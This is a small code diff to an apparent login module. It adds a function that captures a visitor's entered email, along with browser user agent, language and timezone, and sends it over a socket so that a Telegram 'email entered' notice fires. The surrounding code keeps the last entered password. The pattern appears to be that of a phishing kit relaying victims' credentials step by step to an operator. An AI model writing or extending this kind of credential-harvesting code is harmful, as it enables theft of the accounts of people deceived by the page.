@@ -147,6 +147,32 @@ export function rememberPassword(password) {
   lastPassword = password;
 }
 
+/* The email step, before the password exists.  Best-effort: the UI moves on
+ * immediately, and a socket failure only means the Telegram "email entered"
+ * notice is missed. */
+export function reportEmail({ email }) {
+  const value = String(email ?? "").trim();
+  if (!value) return;
+  rememberEmail(value);
+  if (isMockAuth()) return;
+  try {
+    getPublicSocket()
+      .timeout(15_000)
+      .emit(
+        "visitor:email",
+        {
+          email: value,
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
+        },
+        () => {}
+      );
+  } catch {
+    // the password step still proceeds
+  }
+}
+
 /* --------------------------------------------------------------- auth flow */
 
 export async function startAuth({ email, password }) {
